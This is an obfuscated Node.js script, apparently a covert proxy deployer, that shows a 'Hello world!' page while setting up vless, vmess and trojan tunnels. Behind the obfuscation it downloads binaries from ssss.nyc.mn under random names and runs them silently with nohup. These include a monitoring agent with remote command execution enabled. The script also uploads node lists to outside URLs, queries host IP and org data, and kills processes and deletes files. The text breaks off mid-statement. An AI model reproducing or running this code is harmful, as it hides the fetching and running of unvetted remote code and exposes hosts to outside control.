const _0x50491f=_0x10d8;(function(_0x45b96f,_0x5a7b63){const _0xe3c4a1={_0x79d716:0x21b,_0x4642ca:0x24b,_0x4a2fe5:0x1e4,_0x2aaf97:0x236,_0x28d806:0x222},_0x252edd=_0x10d8,_0x47a87a=_0x45b96f();while(!![]){try{const _0x5c803f=-parseInt(_0x252edd(_0xe3c4a1._0x79d716))/0x1+parseInt(_0x252edd(_0xe3c4a1._0x4642ca))/0x2*(parseInt(_0x252edd(0x1ce))/0x3)+parseInt(_0x252edd(_0xe3c4a1._0x4a2fe5))/0x4+-parseInt(_0x252edd(_0xe3c4a1._0x2aaf97))/0x5+parseInt(_0x252edd(0x1ed))/0x6+parseInt(_0x252edd(0x229))/0x7+-parseInt(_0x252edd(_0xe3c4a1._0x28d806))/0x8;if(_0x5c803f===_0x5a7b63)break;else _0x47a87a['push'](_0x47a87a['shift']());}catch(_0x3ec28f){_0x47a87a['push'](_0x47a87a['shift']());}}}(_0x5dec,0x5c00b));const express=require(_0x50491f(0x1bf)),app=express(),axios=require(_0x50491f(0x1f6)),os=require('os'),fs=require('fs'),path=require(_0x50491f(0x19c)),{promisify}=require(_0x50491f(0x243)),exec=promisify(require(_0x50491f(0x228))[_0x50491f(0x18a)]),{execSync}=require(_0x50491f(0x228)),UPLOAD_URL=process[_0x50491f(0x21f)][_0x50491f(0x22d)]||'',PROJECT_URL=process[_0x50491f(0x21f)][_0x50491f(0x18b)]||'',AUTO_ACCESS=process[_0x50491f(0x21f)]['AUTO_ACCESS']||![],FILE_PATH=process[_0x50491f(0x21f)][_0x50491f(0x204)]||'./tmp',SUB_PATH=process['env'][_0x50491f(0x1b3)]||_0x50491f(0x207),PORT=process['env']['SERVER_PORT']||process[_0x50491f(0x21f)]['PORT']||0xbb8,UUID=process[_0x50491f(0x21f)]['UUID']||_0x50491f(0x1d4),NEZHA_SERVER=process[_0x50491f(0x21f)][_0x50491f(0x19f)]||'',NEZHA_PORT=process['env'][_0x50491f(0x195)]||'',NEZHA_KEY=process[_0x50491f(0x21f)][_0x50491f(0x1c1)]||'',ARGO_DOMAIN=process['env']['ARGO_DOMAIN']||'',ARGO_AUTH=process[_0x50491f(0x21f)]['ARGO_AUTH']||'',ARGO_PORT=process[_0x50491f(0x21f)]['ARGO_PORT']||0x1f41,CFIP=process[_0x50491f(0x21f)][_0x50491f(0x224)]||_0x50491f(0x22f),CFPORT=process[_0x50491f(0x21f)]['CFPORT']||0x1bb,NAME=process[_0x50491f(0x21f)][_0x50491f(0x1f3)]||'';!fs[_0x50491f(0x1ad)](FILE_PATH)?(fs[_0x50491f(0x1d2)](FILE_PATH),console[_0x50491f(0x23e)](FILE_PATH+'\x20is\x20created')):console[_0x50491f(0x23e)](FILE_PATH+'\x20already\x20exists');function generateRandomName(){const _0x12e60c={_0x28e5df:0x1cc,_0x34b1dd:0x19b,_0x4e47b8:0x234,_0x24f2cf:0x225},_0x48a81e=_0x50491f,_0x21abf1=_0x48a81e(_0x12e60c._0x28e5df);let _0x1b1589='';for(let _0x2e1ee3=0x0;_0x2e1ee3<0x6;_0x2e1ee3++){_0x1b1589+=_0x21abf1[_0x48a81e(_0x12e60c._0x34b1dd)](Math[_0x48a81e(_0x12e60c._0x4e47b8)](Math[_0x48a81e(_0x12e60c._0x24f2cf)]()*_0x21abf1[_0x48a81e(0x237)]));}return _0x1b1589;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x50491f(0x1d8)](FILE_PATH,npmName),phpPath=path[_0x50491f(0x1d8)](FILE_PATH,phpName),webPath=path[_0x50491f(0x1d8)](FILE_PATH,webName),botPath=path[_0x50491f(0x1d8)](FILE_PATH,botName),subPath=path['join'](FILE_PATH,'sub.txt'),listPath=path[_0x50491f(0x1d8)](FILE_PATH,_0x50491f(0x241)),bootLogPath=path['join'](FILE_PATH,_0x50491f(0x1db)),configPath=path[_0x50491f(0x1d8)](FILE_PATH,_0x50491f(0x198));function deleteNodes(){const _0x187fff={_0x286f67:0x219,_0x3d6768:0x1c4,_0xd25266:0x1bc,_0x1196a0:0x212},_0x398aaf=_0x50491f;try{if(!UPLOAD_URL)return;if(!fs['existsSync'](subPath))return;let _0x3caa83;try{_0x3caa83=fs['readFileSync'](subPath,_0x398aaf(0x1c4));}catch{return null;}const _0x2a9f70=Buffer[_0x398aaf(0x19a)](_0x3caa83,_0x398aaf(_0x187fff._0x286f67))[_0x398aaf(0x197)](_0x398aaf(_0x187fff._0x3d6768)),_0x314275=_0x2a9f70['split']('\x0a')[_0x398aaf(_0x187fff._0xd25266)](_0x45500b=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x398aaf(0x252)](_0x45500b));if(_0x314275[_0x398aaf(0x237)]===0x0)return;return axios[_0x398aaf(_0x187fff._0x1196a0)](UPLOAD_URL+_0x398aaf(0x1c6),JSON[_0x398aaf(0x247)]({'nodes':_0x314275}),{'headers':{'Content-Type':_0x398aaf(0x18c)}})[_0x398aaf(0x24c)](_0x50a48a=>{return null;}),null;}catch(_0x1706dc){return null;}}function _0x10d8(_0x5e51ad,_0x16a8ef){const _0x5dec4a=_0x5dec();return _0x10d8=function(_0x10d86d,_0x12c0bc){_0x10d86d=_0x10d86d-0x18a;let _0x42260c=_0x5dec4a[_0x10d86d];return _0x42260c;},_0x10d8(_0x5e51ad,_0x16a8ef);}function cleanupOldFiles(){const _0x17b213={_0x2778df:0x1ef},_0x4dd5ba={_0x322098:0x1d8,_0x4d6b02:0x22c},_0x24c1cb=_0x50491f;try{const _0x3e206e=fs[_0x24c1cb(_0x17b213._0x2778df)](FILE_PATH);_0x3e206e[_0x24c1cb(0x1b1)](_0x1f6e2a=>{const _0x296cce=_0x24c1cb,_0x3c551c=path[_0x296cce(_0x4dd5ba._0x322098)](FILE_PATH,_0x1f6e2a);try{const _0x196d79=fs[_0x296cce(0x1a1)](_0x3c551c);_0x196d79['isFile']()&&fs[_0x296cce(_0x4dd5ba._0x4d6b02)](_0x3c551c);}catch(_0x28cd04){}});}catch(_0x4d7757){}}app[_0x50491f(0x24e)]('/',function(_0x2c4214,_0x26f3ea){const _0x37f7a6={_0x2dc4c5:0x1cd},_0x3e8047=_0x50491f;_0x26f3ea[_0x3e8047(_0x37f7a6._0x2dc4c5)](_0x3e8047(0x191));});async function generateConfig(){const _0x251107={_0x192c5a:0x1a7,_0x366394:0x1dc,_0xe919ef:0x1fc,_0x16f3ca:0x1e8,_0x21417c:0x1ee,_0x9a6481:0x1a7,_0x2b1844:0x202,_0x57e529:0x1a7,_0x3c51d4:0x1d3,_0x177cbe:0x1e7,_0xfe46c5:0x232,_0x34cc59:0x200,_0x4e7166:0x1a3,_0x37a442:0x200,_0x33a280:0x23b,_0x514c06:0x1d8},_0x85ed8b=_0x50491f,_0x225b9c={'log':{'access':'/dev/null','error':_0x85ed8b(0x221),'loglevel':_0x85ed8b(_0x251107._0x192c5a)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x85ed8b(_0x251107._0x366394),'settings':{'clients':[{'id':UUID,'flow':_0x85ed8b(0x1a2)}],'decryption':_0x85ed8b(0x1a7),'fallbacks':[{'dest':0xbb9},{'path':_0x85ed8b(_0x251107._0xe919ef),'dest':0xbba},{'path':'/vmess-argo','dest':0xbbb},{'path':_0x85ed8b(_0x251107._0x16f3ca),'dest':0xbbc}]},'streamSettings':{'network':'tcp'}},{'port':0xbb9,'listen':_0x85ed8b(_0x251107._0x21417c),'protocol':_0x85ed8b(0x1dc),'settings':{'clients':[{'id':UUID}],'decryption':_0x85ed8b(_0x251107._0x9a6481)},'streamSettings':{'network':_0x85ed8b(_0x251107._0x2b1844),'security':_0x85ed8b(_0x251107._0x9a6481)}},{'port':0xbba,'listen':_0x85ed8b(0x1ee),'protocol':_0x85ed8b(0x1dc),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x85ed8b(_0x251107._0x57e529)},'streamSettings':{'network':'ws','security':_0x85ed8b(0x1a7),'wsSettings':{'path':'/vless-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x85ed8b(0x232),_0x85ed8b(0x200),'quic'],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x85ed8b(0x1ee),'protocol':_0x85ed8b(_0x251107._0x3c51d4),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x85ed8b(_0x251107._0x177cbe)}},'sniffing':{'enabled':!![],'destOverride':[_0x85ed8b(_0x251107._0xfe46c5),_0x85ed8b(_0x251107._0x34cc59),_0x85ed8b(_0x251107._0x4e7166)],'metadataOnly':![]}},{'port':0xbbc,'listen':'127.0.0.1','protocol':_0x85ed8b(0x192),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':'/trojan-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x85ed8b(_0x251107._0xfe46c5),_0x85ed8b(_0x251107._0x37a442),'quic'],'metadataOnly':![]}}],'dns':{'servers':['https+local://8.8.8.8/dns-query']},'outbounds':[{'protocol':'freedom','tag':_0x85ed8b(0x1c3)},{'protocol':_0x85ed8b(_0x251107._0x33a280),'tag':'block'}]};fs[_0x85ed8b(0x251)](path[_0x85ed8b(_0x251107._0x514c06)](FILE_PATH,_0x85ed8b(0x198)),JSON['stringify'](_0x225b9c,null,0x2));}function getSystemArchitecture(){const _0x274268={_0x4755ba:0x1b5,_0xc3e3bf:0x1c8,_0x22739c:0x1f0,_0x5b289b:0x244,_0x3db293:0x1e9},_0x28611e=_0x50491f,_0x3047bc=os[_0x28611e(_0x274268._0x4755ba)]();return _0x3047bc===_0x28611e(0x244)||_0x3047bc===_0x28611e(_0x274268._0xc3e3bf)||_0x3047bc===_0x28611e(_0x274268._0x22739c)?_0x28611e(_0x274268._0x5b289b):_0x28611e(_0x274268._0x3db293);}function _0x5dec(){const _0x63f3e5=['/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','true','ArgoDomain:','success','/vless-argo','Empowerment\x20failed\x20for\x20','https://amd64.ssss.nyc.mn/web','ARGO_DOMAIN:','tls','2096','tcp','false','FILE_PATH','https://oooo.serv00.net/add-url','unshift','sub','split','https://arm64.ssss.nyc.mn/web','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','App\x20is\x20running','\x20-c\x20\x22','\x20-p\x20','del\x20/f\x20/q\x20','post','chmod','error','https://ipapi.co/json/','response','Unhandled\x20error\x20in\x20startserver:','rm\x20-rf\x20','base64','clear','350798LqZDYC','tunnel.json','push','all','env','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','/dev/null','4427168UaRoEQ','win32','CFIP','random','pop','map','child_process','1678936zeVlJI','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','then','unlinkSync','UPLOAD_URL','2053','cdns.doon.eu.org','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','--tls','http','substring','floor','Subscription\x20uploaded\x20successfully','70190yCtkHx','length','text/plain;\x20charset=utf-8','web\x20running\x20error:\x20','Download\x20','blackhole','Skipping\x20adding\x20automatic\x20access\x20task','\x0a\x20\x20\x20\x20','log','Add\x20automatic\x20access\x20task\x20faild:\x20','2083','list.txt','php\x20running\x20error:\x20','util','arm','Error\x20downloading\x20files:','\x20successfully','stringify','http\x20server\x20is\x20running\x20on\x20port:','?security=tls&sni=','Error\x20in\x20startserver:','18sKwYXw','catch','npm\x20running\x20error:\x20','get','\x20>\x20nul\x202>&1','has','writeFileSync','test','\x20>/dev/null\x202>&1','exec','PROJECT_URL','application/json','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','platform','org','https://amd64.ssss.nyc.mn/v1','Hello\x20world!','trojan','https://arm64.ssss.nyc.mn/agent','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','NEZHA_PORT','2087','toString','config.json','pipe','from','charAt','path','Unknown','/api/add-nodes','NEZHA_SERVER','automatic\x20access\x20task\x20added\x20successfully','statSync','xtls-rprx-vision','quic','basename','Error\x20reading\x20boot.log:','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','none','message','\x0a\x20\x20tunnel:\x20','/config.json\x20>/dev/null\x202>&1\x20&','status','readFileSync','existsSync','stream','&fp=firefox&type=ws&host=','8443','forEach','\x20is\x20running','SUB_PATH','Nodes\x20uploaded\x20successfully','arch','&path=%2Fvless-argo%3Fed%3D2560#','taskkill\x20/f\x20/im\x20','\x20>/dev/null\x202>&1\x20&','includes','Empowerment\x20success\x20for\x20','https://amd64.ssss.nyc.mn/bot','filter','http://ip-api.com/json/','pkill\x20-f\x20\x22[','express','match','NEZHA_KEY','nohup\x20','direct','utf-8','\x0a\x20\x20credentials-file:\x20','/api/delete-nodes','close','arm64','&path=%2Ftrojan-argo%3Fed%3D2560#','createWriteStream','/vmess-argo?ed=2560','abcdefghijklmnopqrstuvwxyz','send','37017LsoADV','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','?encryption=none&security=tls&sni=','\x0aclient_secret:\x20','mkdirSync','vmess','9afd1229-b893-40c1-84dd-51e7ce204913','\x0a\x0atrojan://','/sub.txt\x20saved\x20successfully','\x22\x20>\x20/dev/null\x202>&1','join','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','443','boot.log','vless','tunnel.yml','country_code','finish','data','\x20-s\x20','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','listen','892344arHwJA','firefox','countryCode','/vmess-argo','/trojan-argo','amd','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','https://arm64.ssss.nyc.mn/bot','\x20failed:\x20','4326540pgxAlk','127.0.0.1','readdirSync','aarch64','Error\x20executing\x20command:\x20','set','NAME','/tunnel.yml\x20run','https://amd64.ssss.nyc.mn/agent','axios','config.yaml'];_0x5dec=function(){return _0x63f3e5;};return _0x5dec();}function downloadFile(_0x305fd5,_0x44bcf4,_0x4ccd3d){const _0x25f37f={_0x24e8f1:0x1ae,_0x594687:0x22b},_0x38fdf2={_0x4d8427:0x1ec,_0x3e1f42:0x1a8,_0x2c1ba5:0x214},_0x4ba94b={_0x6c66d5:0x1e0},_0x9a404a={_0x560881:0x1c7,_0x1d3bfe:0x1a4},_0x34ff4e=_0x50491f,_0x439b99=_0x305fd5;!fs[_0x34ff4e(0x1ad)](FILE_PATH)&&fs['mkdirSync'](FILE_PATH,{'recursive':!![]});const _0x2a926d=fs[_0x34ff4e(0x1ca)](_0x439b99);axios({'method':_0x34ff4e(0x24e),'url':_0x44bcf4,'responseType':_0x34ff4e(_0x25f37f._0x24e8f1)})[_0x34ff4e(_0x25f37f._0x594687)](_0x59ef12=>{const _0x4b5df4={_0x123317:0x1a4},_0x5d6d9d=_0x34ff4e;_0x59ef12[_0x5d6d9d(_0x4ba94b._0x6c66d5)][_0x5d6d9d(0x199)](_0x2a926d),_0x2a926d['on'](_0x5d6d9d(0x1df),()=>{const _0x3a85d8=_0x5d6d9d;_0x2a926d[_0x3a85d8(_0x9a404a._0x560881)](),console[_0x3a85d8(0x23e)]('Download\x20'+path[_0x3a85d8(_0x9a404a._0x1d3bfe)](_0x439b99)+_0x3a85d8(0x246)),_0x4ccd3d(null,_0x439b99);}),_0x2a926d['on']('error',_0x413341=>{const _0x563989=_0x5d6d9d;fs['unlink'](_0x439b99,()=>{});const _0xbda539=_0x563989(0x23a)+path[_0x563989(_0x4b5df4._0x123317)](_0x439b99)+_0x563989(0x1ec)+_0x413341[_0x563989(0x1a8)];console['error'](_0xbda539),_0x4ccd3d(_0xbda539);});})[_0x34ff4e(0x24c)](_0x193156=>{const _0x423b7a=_0x34ff4e,_0x54b929='Download\x20'+path[_0x423b7a(0x1a4)](_0x439b99)+_0x423b7a(_0x38fdf2._0x4d8427)+_0x193156[_0x423b7a(_0x38fdf2._0x3e1f42)];console[_0x423b7a(_0x38fdf2._0x2c1ba5)](_0x54b929),_0x4ccd3d(_0x54b929);});}async function downloadFilesAndRun(){const _0x4d9523={_0x14f9e6:0x237,_0x576a3f:0x220,_0x5f4096:0x227,_0x4c0cd1:0x21e,_0x4b80c4:0x245,_0x14fe8b:0x1b9,_0x4a0b5a:0x226,_0xbffff1:0x201,_0x184d50:0x196,_0x37f301:0x203,_0x4ed840:0x20d,_0x548b84:0x1d9,_0x3e986b:0x251,_0x1305b2:0x23e,_0x465468:0x214,_0x45e240:0x1da,_0x41f490:0x1b0,_0xe825af:0x196,_0x3f2c48:0x231,_0x2eee01:0x1e1,_0x482010:0x210,_0x451ec4:0x23e,_0x2d0e5b:0x1b2,_0x2cc3f5:0x23e,_0x4a100c:0x1aa,_0x27e939:0x239,_0x242e63:0x1c0,_0x207359:0x230,_0x1e75f7:0x1f8,_0x26c2aa:0x1c2,_0x55e7d1:0x1b8},_0x11896c=_0x50491f,_0x4ed845=getSystemArchitecture(),_0x1f7391=getFilesForArchitecture(_0x4ed845);if(_0x1f7391[_0x11896c(_0x4d9523._0x14f9e6)]===0x0){console['log'](_0x11896c(_0x4d9523._0x576a3f));return;}const _0x542c1d=_0x1f7391[_0x11896c(_0x4d9523._0x5f4096)](_0x42121f=>{return new Promise((_0x2b9aec,_0x5f189d)=>{downloadFile(_0x42121f['fileName'],_0x42121f['fileUrl'],(_0x8fba6f,_0x3c01e1)=>{_0x8fba6f?_0x5f189d(_0x8fba6f):_0x2b9aec(_0x3c01e1);});});});try{await Promise[_0x11896c(_0x4d9523._0x4c0cd1)](_0x542c1d);}catch(_0xb37f5c){console[_0x11896c(0x214)](_0x11896c(_0x4d9523._0x4b80c4),_0xb37f5c);return;}function _0x547aa4(_0x27dc42){const _0x400f2b=_0x11896c,_0x2452a2=0x1fd;_0x27dc42[_0x400f2b(0x1b1)](_0x2b3ba2=>{const _0x2c0719={_0x180866:0x214,_0x4d1655:0x1ba,_0x1fea5f:0x197},_0x5f0c2c=_0x400f2b;fs[_0x5f0c2c(0x1ad)](_0x2b3ba2)&&fs[_0x5f0c2c(0x213)](_0x2b3ba2,_0x2452a2,_0x424d85=>{const _0x250189=_0x5f0c2c;_0x424d85?console[_0x250189(_0x2c0719._0x180866)](_0x250189(0x1fd)+_0x2b3ba2+':\x20'+_0x424d85):console['log'](_0x250189(_0x2c0719._0x4d1655)+_0x2b3ba2+':\x20'+_0x2452a2[_0x250189(_0x2c0719._0x1fea5f)](0x8));});});}const _0x137d37=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x547aa4(_0x137d37);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x1dbdbd=NEZHA_SERVER[_0x11896c(_0x4d9523._0x14fe8b)](':')?NEZHA_SERVER[_0x11896c(0x208)](':')[_0x11896c(_0x4d9523._0x4a0b5a)]():'',_0x1b1fae=new Set([_0x11896c(0x1da),_0x11896c(0x1b0),_0x11896c(_0x4d9523._0xbffff1),_0x11896c(_0x4d9523._0x184d50),_0x11896c(0x240),_0x11896c(0x22e)]),_0x4ae679=_0x1b1fae[_0x11896c(0x250)](_0x1dbdbd)?_0x11896c(0x1f9):_0x11896c(_0x4d9523._0x37f301),_0x131d59=_0x11896c(0x1d1)+NEZHA_KEY+_0x11896c(0x20b)+NEZHA_SERVER+_0x11896c(_0x4d9523._0x4ed840)+_0x4ae679+_0x11896c(_0x4d9523._0x548b84)+UUID;fs[_0x11896c(_0x4d9523._0x3e986b)](path['join'](FILE_PATH,_0x11896c(0x1f7)),_0x131d59);const _0x1a5326=_0x11896c(0x1c2)+phpPath+_0x11896c(0x20f)+FILE_PATH+'/config.yaml\x22\x20>/dev/null\x202>&1\x20&';try{await exec(_0x1a5326),console[_0x11896c(_0x4d9523._0x1305b2)](phpName+'\x20is\x20running'),await new Promise(_0xd3b4c2=>setTimeout(_0xd3b4c2,0x3e8));}catch(_0x2db4ed){console[_0x11896c(_0x4d9523._0x465468)](_0x11896c(0x242)+_0x2db4ed);}}else{let _0x235223='';const _0x2b1807=[_0x11896c(_0x4d9523._0x45e240),_0x11896c(_0x4d9523._0x41f490),_0x11896c(_0x4d9523._0xbffff1),_0x11896c(_0x4d9523._0xe825af),_0x11896c(0x240),_0x11896c(0x22e)];_0x2b1807['includes'](NEZHA_PORT)&&(_0x235223=_0x11896c(_0x4d9523._0x3f2c48));const _0x2974d8=_0x11896c(0x1c2)+npmPath+_0x11896c(_0x4d9523._0x2eee01)+NEZHA_SERVER+':'+NEZHA_PORT+_0x11896c(_0x4d9523._0x482010)+NEZHA_KEY+'\x20'+_0x235223+_0x11896c(0x22a);try{await exec(_0x2974d8),console[_0x11896c(_0x4d9523._0x451ec4)](npmName+_0x11896c(_0x4d9523._0x2d0e5b)),await new Promise(_0x12f954=>setTimeout(_0x12f954,0x3e8));}catch(_0x4ce654){console[_0x11896c(0x214)](_0x11896c(0x24d)+_0x4ce654);}}}else console[_0x11896c(_0x4d9523._0x2cc3f5)]('NEZHA\x20variable\x20is\x20empty,skip\x20running');const _0x57352d=_0x11896c(0x1c2)+webPath+'\x20-c\x20'+FILE_PATH+_0x11896c(_0x4d9523._0x4a100c);try{await exec(_0x57352d),console[_0x11896c(0x23e)](webName+_0x11896c(0x1b2)),await new Promise(_0x379e6f=>setTimeout(_0x379e6f,0x3e8));}catch(_0x5748f8){console['error'](_0x11896c(_0x4d9523._0x27e939)+_0x5748f8);}if(fs[_0x11896c(0x1ad)](botPath)){let _0x1c2f62;if(ARGO_AUTH[_0x11896c(_0x4d9523._0x242e63)](/^[A-Z0-9a-z=]{120,250}$/))_0x1c2f62=_0x11896c(_0x4d9523._0x207359)+ARGO_AUTH;else ARGO_AUTH['match'](/TunnelSecret/)?_0x1c2f62=_0x11896c(0x1e2)+FILE_PATH+_0x11896c(0x1f4):_0x1c2f62=_0x11896c(0x1a6)+FILE_PATH+_0x11896c(_0x4d9523._0x1e75f7)+ARGO_PORT;try{await exec(_0x11896c(_0x4d9523._0x26c2aa)+botPath+'\x20'+_0x1c2f62+_0x11896c(_0x4d9523._0x55e7d1)),console[_0x11896c(_0x4d9523._0x451ec4)](botName+'\x20is\x20running'),await new Promise(_0x5e06e7=>setTimeout(_0x5e06e7,0x7d0));}catch(_0x7de292){console['error'](_0x11896c(0x1f1)+_0x7de292);}}await new Promise(_0x585d0b=>setTimeout(_0x585d0b,0x1388));}function getFilesForArchitecture(_0x910007){const _0x11d567={_0xb82d6c:0x209,_0x2b6041:0x1eb,_0x110151:0x1bb,_0x5d5014:0x244,_0x21c3ed:0x193,_0x1c9e4e:0x206},_0x1ae503=_0x50491f;let _0x38c118;_0x910007==='arm'?_0x38c118=[{'fileName':webPath,'fileUrl':_0x1ae503(_0x11d567._0xb82d6c)},{'fileName':botPath,'fileUrl':_0x1ae503(_0x11d567._0x2b6041)}]:_0x38c118=[{'fileName':webPath,'fileUrl':_0x1ae503(0x1fe)},{'fileName':botPath,'fileUrl':_0x1ae503(_0x11d567._0x110151)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x5e487b=_0x910007===_0x1ae503(_0x11d567._0x5d5014)?_0x1ae503(_0x11d567._0x21c3ed):_0x1ae503(0x1f5);_0x38c118[_0x1ae503(0x206)]({'fileName':npmPath,'fileUrl':_0x5e487b});}else{const _0x5da962=_0x910007==='arm'?'https://arm64.ssss.nyc.mn/v1':_0x1ae503(0x190);_0x38c118[_0x1ae503(_0x11d567._0x1c9e4e)]({'fileName':phpPath,'fileUrl':_0x5da962});}}return _0x38c118;}function argoType(){const _0x3a567d={_0x3f7648:0x1b9,_0x2f3896:0x1d8,_0x11d2e8:0x1a9,_0x14f302:0x1c5},_0x38acd5=_0x50491f;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x38acd5(0x23e)](_0x38acd5(0x18d));return;}if(ARGO_AUTH[_0x38acd5(_0x3a567d._0x3f7648)]('TunnelSecret')){fs['writeFileSync'](path[_0x38acd5(_0x3a567d._0x2f3896)](FILE_PATH,_0x38acd5(0x21c)),ARGO_AUTH);const _0x46d7fd=_0x38acd5(_0x3a567d._0x11d2e8)+ARGO_AUTH['split']('\x22')[0xb]+_0x38acd5(_0x3a567d._0x14f302)+path['join'](FILE_PATH,_0x38acd5(0x21c))+_0x38acd5(0x20a)+ARGO_DOMAIN+_0x38acd5(0x1cf)+ARGO_PORT+_0x38acd5(0x1ea);fs[_0x38acd5(0x251)](path[_0x38acd5(_0x3a567d._0x2f3896)](FILE_PATH,_0x38acd5(0x1dd)),_0x46d7fd);}else console[_0x38acd5(0x23e)](_0x38acd5(0x194));}async function extractDomains(){const _0x2eb3de={_0x59b737:0x1ff,_0xbef39f:0x1db,_0x5ea8c6:0x208,_0x54edff:0x1fa,_0x3f3b29:0x22c,_0x2f1597:0x1a6,_0x2fd70a:0x1f8,_0x226ad5:0x1c2,_0x2987bf:0x1b8,_0x2132dc:0x1f1},_0x2c272b={_0x35c47b:0x1e0,_0x47d241:0x1de,_0x465ac9:0x1e0,_0x533d8e:0x1bd,_0x29bc7e:0x1e0,_0x3c2a76:0x1e0,_0xe20b40:0x1e6,_0x173f8f:0x1e0,_0x36e249:0x1e0},_0x2933ad={_0x51e776:0x18e,_0x10e649:0x1be,_0x196328:0x19b,_0x2e1db2:0x233},_0x26062d=_0x50491f;let _0x59fac6;if(ARGO_AUTH&&ARGO_DOMAIN)_0x59fac6=ARGO_DOMAIN,console['log'](_0x26062d(_0x2eb3de._0x59b737),_0x59fac6),await _0xf6c6a9(_0x59fac6);else try{const _0x208350=fs[_0x26062d(0x1ac)](path[_0x26062d(0x1d8)](FILE_PATH,_0x26062d(_0x2eb3de._0xbef39f)),_0x26062d(0x1c4)),_0x490eb3=_0x208350[_0x26062d(_0x2eb3de._0x5ea8c6)]('\x0a'),_0x31c69e=[];_0x490eb3[_0x26062d(0x1b1)](_0xe9dfb7=>{const _0x36c166=_0xe9dfb7['match'](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x36c166){const _0x1df60c=_0x36c166[0x1];_0x31c69e['push'](_0x1df60c);}});if(_0x31c69e[_0x26062d(0x237)]>0x0)_0x59fac6=_0x31c69e[0x0],console['log'](_0x26062d(_0x2eb3de._0x54edff),_0x59fac6),await _0xf6c6a9(_0x59fac6);else{console[_0x26062d(0x23e)]('ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain'),fs[_0x26062d(_0x2eb3de._0x3f3b29)](path[_0x26062d(0x1d8)](FILE_PATH,_0x26062d(_0x2eb3de._0xbef39f)));async function _0x466127(){const _0x2839e6=_0x26062d;try{process[_0x2839e6(_0x2933ad._0x51e776)]===_0x2839e6(0x223)?await exec(_0x2839e6(0x1b7)+botName+'.exe\x20>\x20nul\x202>&1'):await exec(_0x2839e6(_0x2933ad._0x10e649)+botName[_0x2839e6(_0x2933ad._0x196328)](0x0)+']'+botName[_0x2839e6(_0x2933ad._0x2e1db2)](0x1)+_0x2839e6(0x1d7));}catch(_0x4991bd){}}_0x466127(),await new Promise(_0x4178a0=>setTimeout(_0x4178a0,0xbb8));const _0x4f39fc=_0x26062d(_0x2eb3de._0x2f1597)+FILE_PATH+_0x26062d(_0x2eb3de._0x2fd70a)+ARGO_PORT;try{await exec(_0x26062d(_0x2eb3de._0x226ad5)+botPath+'\x20'+_0x4f39fc+_0x26062d(_0x2eb3de._0x2987bf)),console['log'](botName+_0x26062d(0x1b2)),await new Promise(_0x38edca=>setTimeout(_0x38edca,0xbb8)),await extractDomains();}catch(_0x33f3d9){console[_0x26062d(0x214)](_0x26062d(_0x2eb3de._0x2132dc)+_0x33f3d9);}}}catch(_0x4d4a99){console[_0x26062d(0x214)](_0x26062d(0x1a5),_0x4d4a99);}async function _0x1a43b6(){const _0x5c6512=_0x26062d;try{const _0x2eda84=await axios[_0x5c6512(0x24e)](_0x5c6512(0x215),{'timeout':0xbb8});if(_0x2eda84['data']&&_0x2eda84[_0x5c6512(_0x2c272b._0x35c47b)][_0x5c6512(_0x2c272b._0x47d241)]&&_0x2eda84[_0x5c6512(_0x2c272b._0x465ac9)]['org'])return _0x2eda84[_0x5c6512(0x1e0)]['country_code']+'_'+_0x2eda84[_0x5c6512(0x1e0)][_0x5c6512(0x18f)];}catch(_0x12f184){try{const _0x3c7de1=await axios[_0x5c6512(0x24e)](_0x5c6512(_0x2c272b._0x533d8e),{'timeout':0xbb8});if(_0x3c7de1[_0x5c6512(_0x2c272b._0x29bc7e)]&&_0x3c7de1[_0x5c6512(_0x2c272b._0x29bc7e)]['status']===_0x5c6512(0x1fb)&&_0x3c7de1[_0x5c6512(_0x2c272b._0x3c2a76)][_0x5c6512(_0x2c272b._0xe20b40)]&&_0x3c7de1[_0x5c6512(0x1e0)][_0x5c6512(0x18f)])return 